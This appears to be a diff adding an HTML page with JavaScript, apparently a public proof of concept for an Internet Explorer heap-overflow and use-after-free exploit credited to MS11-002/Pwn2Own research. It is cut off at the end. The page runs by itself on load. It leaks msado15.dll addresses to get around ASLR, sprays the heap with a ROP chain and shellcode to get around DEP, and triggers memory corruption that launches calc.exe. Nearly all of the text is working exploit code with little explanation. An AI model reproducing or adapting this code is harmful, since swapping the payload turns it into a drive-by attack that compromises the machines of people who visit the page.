@@ -1,0 +1,349 @@
+<html xmlns:t = "urn:schemas-microsoft-com:time">
+  <head>
+  <meta name="License" content="Q Public License;http://en.wikipedia.org/wiki/Q_Public_License">
+    <style>
+      .body {
+      
+      }
+      #test {
+    
+      }
+    </style>
+    <script src="heapLib.js"></script>
+    <script>
+    // This code has been released under the Q Public License by Trolltech
+    // http://en.wikipedia.org/wiki/Q_Public_License
+    // Source: http://vreugdenhilresearch.nl/ms11-002-pwn2own-heap-overflow/
+
+
+var StartTime = new Date();    
+var FinalHeapSpraySize = 900;
+//var SmallHoleSize = 0x1F0;
+var SmallHoleSize = 0x240;
+var GlobalRowCounter = 0;
+  
+var localxmlid1;
+var localxmlid2;    
+var localxmlid3;    
+var localxmlid5;  
+var adobase = 0;
+var finalspray = '';
+var heap = null;
+var ExpoitTime = 10;
+var CurrentHeapSpraySize = 0;
+
+
+function Start() {
+	FaseOne();
+}
+
+
+
+function FaseOne() {
+
+  localxmlid1 = document.getElementById('xmlid1').recordset;    
+  localxmlid2 = document.getElementById('xmlid2').recordset;    
+  localxmlid3 = document.getElementById('xmlid3').recordset;    
+  localxmlid5 = document.getElementById('xmlid5').recordset;    
+  
+  localxmlid2.CacheSize = 0x40000358;
+  
+  localxmlid1.CacheSize = SmallHoleSize;;   //small hole?
+  localxmlid1.AddNew(["AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"], ["c"]); 
+  localxmlid5.AddNew(["BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"], ["c"]); 
+  
+  
+  var my1field = localxmlid5.Fields.Item(0);
+  localxmlid1.MoveFirst();
+  
+  localxmlid2.AddNew(["BBBB"], ["c"]);  
+  
+  localxmlid1.Close();
+  CollectGarbage();
+  
+  localxmlid3.MoveFirst();
+  
+  void(Math.atan2(0xbabe, ('###################### 2 Move First').toString()));
+  localxmlid2.MoveFirst();
+
+  void(Math.atan2(0xbabe, ('###################### 5 Move First').toString()));
+  localxmlid5.CacheSize = 0x40000008;
+  localxmlid5.MoveFirst();
+  localxmlid3.AddNew(["MyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLong"], ["cccccuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuFINDMEccccc"]); 
+
+  var localxmlid4 = document.getElementById('xmlid4').recordset;    
+
+  localxmlid4.AddNew(["bb"], ["c"]); 
+
+  localxmlid4.MoveNext();  
+  
+  
+  var localxmlid6 = document.getElementById('xmlid6').recordset; 
+  localxmlid6.AddNew(["CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC"], ["c"]);  
+  
+  localxmlid2.MoveFirst();
+  
+  Math.tan(1);
+  
+  document.getElementById('textfaseone').innerText = 'Setting up data for ASLR evasion:';
+  if(GlobalRowCounter < 0x10120) {
+  	window.setTimeout(IncreaseRowCounter, 100);
+  }
+}
+
+
+function IncreaseRowCounter() {
+	//alert('IncreaseRowCounter: ' + GlobalRowCounter)
+	if(GlobalRowCounter < 0x10120) {		
+  	for(i = 0; i < 0x300; i++) {  		
+  		GlobalRowCounter++;
+      localxmlid2.AddNew(["BBBB"], ["c"]); 
+      localxmlid2.Delete();
+    }
+    var percentcomplete = Math.round(GlobalRowCounter /0x10120 * 100);
+    document.getElementById('progressfaseone').innerText = percentcomplete + "%";
+    window.setTimeout(IncreaseRowCounter, 100);
+  }
+  else {
+  	document.getElementById('textfaseonedone').innerText = 'Now searching memory for suitable vtable. Please wait...';
+  	window.setTimeout(FindADOBase, 100);
+  }
+}
+
+function FindADOBase() {
+	//alert('FindADOBase');
+  
+  	
+  var myfield = localxmlid3.Fields.Item(1);
+
+  	for(i = 0; i < 0xDF6; i++) {
+      localxmlid2.AddNew(["BBBB"], ["c"]); 
+      localxmlid2.MoveFirst();
+      if(myfield.Name != "MyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLong") {
+      	break;
+      }
+    }
+    //alert('done first');
+
+  void(Math.atan2(0xbabe, ('###################### Add untill vftable 2').toString()));
+  
+  var vftable1 = null;
+  var vftable2 = null;
+  
+  	for(i = 0; i < 0xAE0; i++) {
+  		void(Math.atan2(0xbabe, ('add row: ' + i).toString()));
+      localxmlid2.AddNew(["BBBB"], ["c"]); 
+      localxmlid2.MoveFirst();
+      //if(i > 10) {
+      //  document.forms[0].myresult.value += i.toString(16) + " : " + escape(myfield.name.substr((2 * i) + 4, 8)) + " : "  + myfield.name.length + "\n";
+      //}
+      if(escape(myfield.name.substr((2 * i) + 4, 2)).match(/uAD68/)) {
+      	vftable1 = escape(myfield.name.substr((2 * i) + 4, 2)).replace(/%u(\w\w\w\w)%u(\w\w\w\w)/, "$2$1");
+      }      
+      if(escape(myfield.name.substr((2 * i) + 4, 2)).match(/uD738/)) {
+      	vftable2 = escape(myfield.name.substr((2 * i) + 4, 2)).replace(/%u(\w\w\w\w)%u(\w\w\w\w)/, "$2$1");
+      }  
+      if(vftable1  && vftable2) {
+      	break;
+      }
+    }
+   //document.forms[0].myresult.value += "\n\nVFTABLES: " + vftable1 + " : " + vftable2 + "\n\n\n";
+   //alert(vftable1);
+   if((parseInt(vftable1,16) - 0x1AD68) == (parseInt(vftable2,16) - 0xD738)) {   	 
+   	 adobase = parseInt(vftable1,16) - 0x1AD68;
+   	 document.getElementById('textfoundaddress').innerText = 'Found base address of <censored>.dll: 0x<censored>';// + adobase.toString(16);
+   	 FaseTwo();
+   }
+   else {
+     alert('sadly we failed to read the base address of msado15.dll :( ');	
+   }
+   
+}    
+
+function FaseTwo() {	
+	document.getElementById('textfasetwo').innerText = 'Setting up heap for DEP evasion:';
+	document.getElementById('progressfasetwo').innerText = '0%';
+  heap = new heapLib.ie(0x20000);
+
+      
+  var heapspray = unescape("%u2020%u1604%u0102%u0103%u0104%u0105" + MakeAddressString(adobase + 0x117C3) + MakeAddressString(adobase + 0x1188 - 0x1C) + "%u010A%u010B" + MakeAddressString(adobase + 0x4270B) + "%u010E%u010F%u0110%u0111%u0112%u0113" + "%u2100%u1604" + "%u0116%u0117%u0118%u0119%u011A%u011B%u011C%u011D%u011E%u011F%u0120%u0121%u0122%u0123" + MakeAddressString(adobase)  + "%u0126%u0127%u0128%u0129%u012A%u012B" + "%u2024%u1604" + "%u012E%u012F%u0130%u0131%u0132%u0133" + "%u0040%u0000" + "%u0136%u0137" + MakeAddressString(adobase + 0x1B1F0)  + "%u013A%u013B" + "%u0200%u0000" + "%u013E%u013F" + "%u2030%u1604" + "%u0142%u0143%u0144%u0145%u0146%u0147%u0148%u0149%u014A%u014B%u014C%u014D%u014E%u014F%u0150%u0151%u0152%u0153%u0154%u0155%u0156%u0157%u0158%u0159%u015A%u015B%u015C%u015D%u015E%u015F%u0160%u0161%u0162%u0163%u0164%u0165%u0166%u0167%u0168%u0169%u016A%u016B%u016C%u016D%u016E%u016F" + 
+                  "%u9090%u9090%u868B%u1108%u0000%u5056%u056A%uA068%u0421%u0516%u185E%u0008%uD0FF%u5058%u0590%u0BBB%u0000%uD0FF%uF88B%u0558%u3B47%u0000%u006A%uFF57%uCCD0" + "%u0189%u018A%u018B%u018C%u018D%u018E%u018F%u0190%u0191%u0192%u0193%u0194%u0195%u0196%u0197%u0198%u0199%u019A%u019B%u019C%u019D%u019E%u019F%u01A0%u01A1%u01A2%u01A3%u01A4%u01A5%u01A6%u01A7%u01A8%u01A9%u01AA%u01AB%u01AC%u01AD%u01AE%u01AF%u01B0%u01B1%u01B2%u01B3%u01B4%u01B5%u01B6%u01B7%u01B8%u01B9%u01BA%u01BB%u01BC%u01BD%u01BE%u01BF" +                                    
+                  "%u6163%u636C%u652E%u6578%u0000%u735C%u7379%u6574%u336D%u5C32%u6163%u636C%u652E%u6578%u0000%u0000" + "%u01D0%u01D1%u01D2%u01D3%u01D4%u01D5%u01D6%u01D7%u01D8%u01D9%u01DA%u01DB%u01DC%u01DD%u01DE%u01DF%u01E0%u01E1%u01E2%u01E3%u01E4%u01E5%u01E6%u01E7%u01E8%u01E9%u01EA%u01EB%u01EC%u01ED%u01EE%u01EF" + "%u20A0%u1604" + "%u01F2%u01F3%u01F4%u01F5%u01F6%u01F7%u01F8%u01F9%u01FA%u01FB%u01FC%u01FD%u01FE%u01FF%u0200%u0201%u0202%u0203%u0204%u0205%u0206%u0207%u0208%u0209%u020A%u020B%u020C%u020D%u020E%u020F%u0210%u0211%u0212%u0213%u0214%u0215%u0216%u0217%u0218%u0219%u021A%u021B%u021C%u021D%u021E%u021F%u0220%u0221%u0222%u0223%u0224%u0225%u0226%u0227%u0228%u0229%u022A%u022B%u022C%u022D%u022E%u022F%u0230%u0231%u0232%u0233%u0234%u0235%u0236%u0237%u0238%u0239%u023A%u023B%u023C%u023D%u023E%u023F%u0240%u0241%u0242%u0243%u0244%u0245%u0246%u0247%u0248%u0249%u024A%u024B%u024C%u024D%u024E%u024F%u0250%u0251%u0252%u0253%u0254%u0255%u0256%u0257%u0258%u0259%u025A%u025B%u025C%u025D%u025E%u025F%u0260%u0261%u0262%u0263%u0264%u0265%u0266%u0267%u0268%u0269%u026A%u026B%u026C%u026D%u026E%u026F%u0270%u0271%u0272%u0273%u0274%u0275%u0276%u0277%u0278%u0279%u027A%u027B%u027C%u027D%u027E%u027F%u0280%u0281%u0282%u0283%u0284%u0285%u0286%u0287%u0288%u0289%u028A%u028B%u028C%u028D%u028E%u028F%u0290%u0291%u0292%u0293%u0294%u0295%u0296%u0297%u0298%u0299%u029A%u029B%u029C%u029D%u029E%u029F%u02A0%u02A1%u02A2%u02A3%u02A4%u02A5%u02A6%u02A7%u02A8%u02A9%u02AA%u02AB%u02AC%u02AD%u02AE%u02AF%u02B0%u02B1%u02B2%u02B3%u02B4%u02B5%u02B6%u02B7%u02B8%u02B9%u02BA%u02BB%u02BC%u02BD%u02BE%u02BF%u02C0%u02C1%u02C2%u02C3%u02C4%u02C5%u02C6%u02C7%u02C8%u02C9%u02CA%u02CB%u02CC%u02CD%u02CE%u02CF%u02D0%u02D1%u02D2%u02D3%u02D4%u02D5%u02D6%u02D7%u02D8%u02D9%u02DA%u02DB%u02DC%u02DD%u02DE%u02DF%u02E0%u02E1%u02E2%u02E3%u02E4%u02E5%u02E6%u02E7%u02E8%u02E9%u02EA%u02EB%u02EC%u02ED%u02EE%u02EF%u02F0%u02F1%u02F2%u02F3%u02F4%u02F5%u02F6%u02F7%u02F8%u02F9%u02FA%u02FB%u02FC%u02FD%u02FE%u02FF");
+                  //"%u6163%u636C%u652D%u6578%u0000
+                 //%u3A63%u775C%u6E69%u6F64%u7377%u735C%u7379%u6574%u336D%u5C32%u6163%u636C%u652E%u6578
+                 //c:\windows\system32\calc.exe
+                 //%63%61%6C%63%2E%65%78%65
+                 //%63%3A%5C%77%69%6E%64%6F%77%73%5C%73%79%73%74%65%6D%33%32%5C%63%61%6C%63%2E%65%78%65    
+                  
+  //var heapspray = unescape("%u2020%u1604%u0102%u0103%u0104%u0105" + MakeAddressString(adobase + 0x117C3) + MakeAddressString(adobase + 0x1188 - 0x1C) + "%u010A%u010B" + MakeAddressString(adobase + 0x4270B) + "%u010E%u010F%u0110%u0111%u0112%u0113" + "%u2100%u1604" + "%u0116%u0117%u0118%u0119%u011A%u011B%u011C%u011D%u011E%u011F%u0120%u0121%u0122%u0123%u0124%u0125%u0126%u0127%u0128%u0129%u012A%u012B" + "%u2024%u1604" + "%u012E%u012F%u0130%u0131%u0132%u0133" + "%u0040%u0000" + "%u0136%u0137" + MakeAddressString(adobase + 0x1B1F0)  + "%u013A%u013B" + "%u0200%u0000" + "%u013E%u013F" + "%u2030%u1604" + "%u0142%u0143%u0144%u0145%u0146%u0147%u0148%u0149%u014A%u014B%u014C%u014D%u014E%u014F%u0150%u0151%u0152%u0153%u0154%u0155%u0156%u0157%u0158%u0159%u015A%u015B%u015C%u015D%u015E%u015F%u0160%u0161%u0162%u0163%u0164%u0165%u0166%u0167%u0168%u0169%u016A%u016B%u016C%u016D%u016E%u016F%u0170%u0171%u0172%u0173%u0174%u0175%u0176%u0177%u0178%u0179%u017A%u017B%u017C%u017D%u017E%u017F%u0180%u0181%u0182%u0183%u0184%u0185%u0186%u0187%u0188%u0189%u018A%u018B%u018C%u018D%u018E%u018F%u0190%u0191%u0192%u0193%u0194%u0195%u0196%u0197%u0198%u0199%u019A%u019B%u019C%u019D%u019E%u019F%u01A0%u01A1%u01A2%u01A3%u01A4%u01A5%u01A6%u01A7%u01A8%u01A9%u01AA%u01AB%u01AC%u01AD%u01AE%u01AF%u01B0%u01B1%u01B2%u01B3%u01B4%u01B5%u01B6%u01B7%u01B8%u01B9%u01BA%u01BB%u01BC%u01BD%u01BE%u01BF%u01C0%u01C1%u01C2%u01C3%u01C4%u01C5%u01C6%u01C7%u01C8%u01C9%u01CA%u01CB%u01CC%u01CD%u01CE%u01CF%u01D0%u01D1%u01D2%u01D3%u01D4%u01D5%u01D6%u01D7%u01D8%u01D9%u01DA%u01DB%u01DC%u01DD%u01DE%u01DF%u01E0%u01E1%u01E2%u01E3%u01E4%u01E5%u01E6%u01E7%u01E8%u01E9%u01EA%u01EB%u01EC%u01ED%u01EE%u01EF" + "%u20A0%u1604" + "%u01F2%u01F3%u01F4%u01F5%u01F6%u01F7%u01F8%u01F9%u01FA%u01FB%u01FC%u01FD%u01FE%u01FF%u0200%u0201%u0202%u0203%u0204%u0205%u0206%u0207%u0208%u0209%u020A%u020B%u020C%u020D%u020E%u020F%u0210%u0211%u0212%u0213%u0214%u0215%u0216%u0217%u0218%u0219%u021A%u021B%u021C%u021D%u021E%u021F%u0220%u0221%u0222%u0223%u0224%u0225%u0226%u0227%u0228%u0229%u022A%u022B%u022C%u022D%u022E%u022F%u0230%u0231%u0232%u0233%u0234%u0235%u0236%u0237%u0238%u0239%u023A%u023B%u023C%u023D%u023E%u023F%u0240%u0241%u0242%u0243%u0244%u0245%u0246%u0247%u0248%u0249%u024A%u024B%u024C%u024D%u024E%u024F%u0250%u0251%u0252%u0253%u0254%u0255%u0256%u0257%u0258%u0259%u025A%u025B%u025C%u025D%u025E%u025F%u0260%u0261%u0262%u0263%u0264%u0265%u0266%u0267%u0268%u0269%u026A%u026B%u026C%u026D%u026E%u026F%u0270%u0271%u0272%u0273%u0274%u0275%u0276%u0277%u0278%u0279%u027A%u027B%u027C%u027D%u027E%u027F%u0280%u0281%u0282%u0283%u0284%u0285%u0286%u0287%u0288%u0289%u028A%u028B%u028C%u028D%u028E%u028F%u0290%u0291%u0292%u0293%u0294%u0295%u0296%u0297%u0298%u0299%u029A%u029B%u029C%u029D%u029E%u029F%u02A0%u02A1%u02A2%u02A3%u02A4%u02A5%u02A6%u02A7%u02A8%u02A9%u02AA%u02AB%u02AC%u02AD%u02AE%u02AF%u02B0%u02B1%u02B2%u02B3%u02B4%u02B5%u02B6%u02B7%u02B8%u02B9%u02BA%u02BB%u02BC%u02BD%u02BE%u02BF%u02C0%u02C1%u02C2%u02C3%u02C4%u02C5%u02C6%u02C7%u02C8%u02C9%u02CA%u02CB%u02CC%u02CD%u02CE%u02CF%u02D0%u02D1%u02D2%u02D3%u02D4%u02D5%u02D6%u02D7%u02D8%u02D9%u02DA%u02DB%u02DC%u02DD%u02DE%u02DF%u02E0%u02E1%u02E2%u02E3%u02E4%u02E5%u02E6%u02E7%u02E8%u02E9%u02EA%u02EB%u02EC%u02ED%u02EE%u02EF%u02F0%u02F1%u02F2%u02F3%u02F4%u02F5%u02F6%u02F7%u02F8%u02F9%u02FA%u02FB%u02FC%u02FD%u02FE%u02FF");
+
+  while(heapspray.length < 0x200) heapspray += unescape("%u4444");
+
+  var heapblock = heapspray;
+  while(heapblock.length < 0x40000) heapblock += heapblock;
+  finalspray = heapblock.substring(2, 0x40000 - 0x21);
+
+  //alert('Base address of ado15.dll ' + adobase.toString(16));
+  if(CurrentHeapSpraySize < 900) {
+  	window.setTimeout(SprayHeap, 100);
+  }
+  else {
+  	RunExploit();
+  }
+}
+
+function SprayHeap() {
+  if(CurrentHeapSpraySize < FinalHeapSpraySize - 1) {
+    for(var i = 0; i < 90; i++) {
+      heap.alloc(finalspray);
+      CurrentHeapSpraySize++;
+    }
+    var percentcomplete = Math.round(CurrentHeapSpraySize /FinalHeapSpraySize * 100);
+    document.getElementById('progressfasetwo').innerText = percentcomplete + "%";    
+    window.setTimeout(SprayHeap, 100);
+  }  
+	else {
+		document.getElementById('textfasetwodone').innerText = "Ready to start calc.exe in: ";    
+		window.setTimeout(RunExploitTimer, 100);
+	}
+	
+}
+
+function RunExploitTimer() {
+	if(ExpoitTime > 0) {
+		document.getElementById('countexploitrun').innerText = ExpoitTime;
+		window.setTimeout(RunExploitTimer, 500);
+		ExpoitTime--;
+	}
+	else {
+		document.getElementById('countexploitrun').innerText = 0;	
+		var EndTime = new Date();
+	  var TotalRun = Math.round((EndTime.getTime() - StartTime.getTime()) / 1000);
+	  document.getElementById('totalruntime').innerText = "Total exploitation time: " + TotalRun + " seconds"; 	
+		window.setTimeout(RunExploit, 100);
+	}
+}
+    
+function RunExploit() {
+ 
+  var elms = new Array();
+  for(i =0; i < 100; i++) {
+	  elms.push(document.createElement('div'));
+  }
+
+  owningObj = document.styleSheets[0].owningElement;  
+
+  myimports = document.styleSheets[0].imports;
+
+  document.appendChild(owningObj);
+  document.removeChild(owningObj);
+
+  owningObj.outerHTML = 'a';
+
+  Math.atan2(0xbabe, "Collect");
+  CollectGarbage();
+
+  Math.atan2(0xbabe, "spray");
+  for(i = 0; i < 100; i++) {
+  	elms[i].className = unescape("%u4140%u4141%u4142%u4143%u4144%u4145%u4146%u4147%u4148%u4149%u414a%u414b%u414c%u414d%u414e%u414f%u4151%u4152%u4153%u4154%u2020%u1604%u2020%u1604%u4159%u415a%u415b");
+  }   
+
+  Result = owningObj.insertAdjacentElement(myimports,'a');
+ 
+	
+}    
+
+function MakeAddressString(addrint) {
+	//First, turn into hex:
+	var addstr = addrint.toString(16);
+	//Split and swap
+	addstr = addstr.replace(/(\w\w\w\w)(\w\w\w\w)/,"%u$2%u$1");
+	return addstr;
+}
+    
+    </script>
+
+  </head>
+  <body onLoad="window.setTimeout(Start,100);" id="bodyid">
+  <div>
+  	<h2 id="textfaseone"></h2>
+  	<br>
+    <h2 id="progressfaseone"></h2>
+    <br>
+    <h2 id="textfaseonedone"></h2>
+    <br>
+    <h2 id="textfoundaddress"></h2>
+    <br>
+    <h2 id="textfasetwo"></h2>
+    <br>
+    <h2 id="progressfasetwo"></h2>
+    <br>
+    <h2 id="textfasetwodone"></h2>
+    <br>
+    <h2 id="countexploitrun"></h2>
+    <br>
+    <h2 id="totalruntime"></h2>
+  </div>
+
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<XML ID="xmlid1">
+<Devices>
+<Device>
+<AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA />
+</Device>
+</Devices>
+</XML>
+
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<XML ID="xmlid2">
+<Devices>
+<Device>
+<BBBB />
+</Device>
+</Devices>
+</XML>
+
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<XML ID="xmlid3">
+<root>
+<data>
+	<SmallData>
+  </SmallData>
+<MyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLong>
+	value1
+</MyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLong>
+</data>
+</root>
+</XML>
+
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<XML ID="xmlid4">
+<Devices>
+<Device>
+<bb />
+</Device>
+</Devices>
+</XML>
+
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<XML ID="xmlid5">
+<Devices>
+<Device>
+<BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB />
+</Device>
+</Devices>
+</XML>
+
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<XML ID="xmlid6">
+<root>
+<data>
